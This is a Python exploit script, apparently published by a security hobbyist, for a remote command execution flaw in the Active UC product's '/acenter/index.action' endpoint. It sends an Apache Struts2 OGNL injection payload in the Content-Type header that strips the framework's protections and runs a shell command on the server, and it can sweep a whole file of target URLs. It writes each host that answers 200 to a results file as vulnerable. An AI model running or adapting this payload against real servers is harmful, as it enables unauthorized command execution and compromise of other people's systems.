import base64
import json
import re

import requests
import argparse
import urllib3
import sys

from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Content-Type':'multipart/form-data; boundary=--------------------------921378126371623762173617d',
    'Contention':'keep-alive',
    'Content-Disposition':'form-data; name="editormd-image-file"; filename="test.<>php"',
    'Content-Type': 'text/plain',
    'Charsert': 'UTF-8',
    'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2'
}


def title():
    print("""
                              Active_UC_index.action_远程命令执行漏洞
                           use: python3 Active_UC_index.action_远程命令执行漏洞.py
                              Author: kento-sec
    """)

# proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        vuln_url = self.url + "/acenter/index.action"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
            "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170"
        }
        data = base64.b64decode(
            "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xODAxMjcyMTcxOTE3MA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJwb2NmaWxlIjsgZmlsZW5hbWU9InRleHQudHh0Ig0KQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluDQoNCnh4eHh4eHgNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTgwMTI3MjE3MTkxNzA=")
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
            if response.status_code == 200:
                    print("\033[36m[o] 目标 {} 存在Active_UC_index.action_远程命令执行漏洞 \033[0m".format(self.url))
                    with open("Active_UC_index.action_远程命令执行漏洞结果.txt", mode="a") as rp:
                        rp.write(self.url + "\n")
            else:
                print("\033[31m[x] 目标 {} 不存在Active_UC_index.action_远程命令执行漏洞 \033[0m".format(self.url))
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="Active_UC_index.action_远程命令执行漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 Active_UC_index.action_远程命令执行漏洞.py -u http://127.0.0.1\neg2:>>>python3 Active_UC_index.action_远程命令执行漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
